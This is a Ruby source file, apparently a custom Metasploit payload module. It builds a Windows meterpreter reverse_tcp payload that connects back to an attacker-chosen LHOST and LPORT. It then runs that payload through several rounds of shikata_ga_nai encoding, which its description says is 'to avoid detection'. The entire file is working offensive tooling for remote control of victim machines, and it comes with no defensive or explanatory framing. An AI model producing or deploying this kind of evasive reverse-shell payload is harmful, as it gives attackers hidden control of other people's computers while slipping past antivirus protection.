##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Payload
    include Msf::Payload::Single
  
    def initialize(info = {})
      super(merge_info(info,
        'Name'          => 'Custom Payload Generator',
        'Description'   => 'Generates a custom payload with specific encoding to avoid detection',
        'Author'        => ['Hector R Rodriguez Lopez'],
        'License'       => MSF_LICENSE,
        'Platform'      => 'win',
        'Arch'          => ARCH_X86,
        'Handler'       => Msf::Handler::ReverseTcp,
        'Session'       => Msf::Sessions::Meterpreter_x86_Win,
        'PayloadType'   => 'windows'
      ))
  
      register_options([
        OptString.new('LHOST', [true, 'The listen address (required for handler)']),
        OptInt.new('LPORT', [true, 'The listen port', 4444]),
        OptString.new('ENCODER', [true, 'The encoder to use', 'x86/shikata_ga_nai']),
        OptInt.new('ITERATIONS', [true, 'The number of encoding iterations', 3])
      ])
    end
  
    def generate_payload
      # Generate the payload based on a reverse_meterpreter payload
      payload_name = 'windows/meterpreter/reverse_tcp'
      
      # Get options from datastore
      lhost = datastore['LHOST']
      lport = datastore['LPORT']
      encoder_name = datastore['ENCODER']
      iterations = datastore['ITERATIONS']
      
      # Print status information
      print_status("Generating payload with encoding: #{encoder_name}")
      
      # Create a payload instance
      payload = framework.payloads.create(payload_name)
      payload.datastore['LHOST'] = lhost
      payload.datastore['LPORT'] = lport
      
      # Generate the payload
      raw_payload = payload.generate_simple(
        'Format' => 'raw',
        'OptionStr' => "LHOST=#{lhost} LPORT=#{lport}"
      )
      
      # Encode the payload
      encoder = framework.encoders.create(encoder_name)
      if encoder.nil?
        print_error("Failed to create encoder: #{encoder_name}")
        return nil
      end
      
      # Configure the encoder
      encoder.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })
      
      # Encode the payload with multiple iterations
      encoded_payload = raw_payload
      iterations.times do |i|
        encoded_payload = encoder.encode(encoded_payload, nil, nil, platform)
      end
      
      # Print the hex representation of the payload (limited for display purposes)
      hex_str = encoded_payload.unpack('H*').first
      formatted_hex = hex_str.scan(/../).map { |b| "\\x#{b}" }.join
      print_good("Generated encoded payload: #{formatted_hex[0..50]}...")
      
      return encoded_payload
    end
    
    def generate
      generate_payload
    end
  end
